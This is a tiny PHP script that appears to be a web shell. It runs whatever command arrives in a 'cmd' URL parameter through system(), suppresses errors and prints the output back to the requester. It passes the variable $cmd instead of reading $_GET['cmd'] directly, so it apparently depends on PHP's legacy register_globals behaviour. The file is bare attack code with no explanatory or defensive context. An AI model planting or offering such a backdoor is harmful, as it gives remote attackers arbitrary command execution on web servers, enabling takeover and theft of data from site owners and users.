<?php
function ekse($cmd){
	@ob_start();
	@system($cmd);
	$buff = @ob_get_contents();
	@ob_end_clean();
	return $buff;
}

if(isset($_GET['cmd'])){
	$result = ekse($cmd);
	echo $result;
}
	
?>